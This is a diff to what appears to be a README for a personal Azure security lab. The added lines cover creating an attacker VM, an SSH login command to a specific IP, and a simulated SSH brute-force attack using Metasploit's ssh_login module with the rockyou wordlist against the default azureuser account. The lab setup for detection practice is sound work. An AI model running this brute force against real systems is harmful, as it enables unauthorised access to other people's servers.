@@ -17,7 +17,25 @@ steps to deploy lab
 - ![image](https://github.com/user-attachments/assets/54f1e4b8-acd7-4119-b123-035f98ae3157)
 - check azure portal for resources that exist  
 ![image](https://github.com/user-attachments/assets/4b0ef310-bdbd-4d72-9174-2be1967fbefd)  
+- create attacker VM, assign it a NIC, assign it a public IP address so you can SSH into it
+- ssh -i ~/.ssh/andyssh attacker@52.168.18.188
+- Install log agent on the VMs
 
+
+Issues Ran into
+- Attacker VM was not configured with public IP
+- Attacker VM was not latest ubuntu version, could not install metasploit due to EOL
+
+
+
+Attack Simulation  
+Default azure login is :set USERNAME azureuser  
+so in metasploit load up module and try for sshbruteforce  
+use auxiliary/scanner/ssh/ssh_login  
+set PASS_FILE /usr/share/wordlists/rockyou.txt  
+run  
+
+![image](https://github.com/user-attachments/assets/e84afcae-124c-4736-b11e-e0c031b666df) 
 
 
 
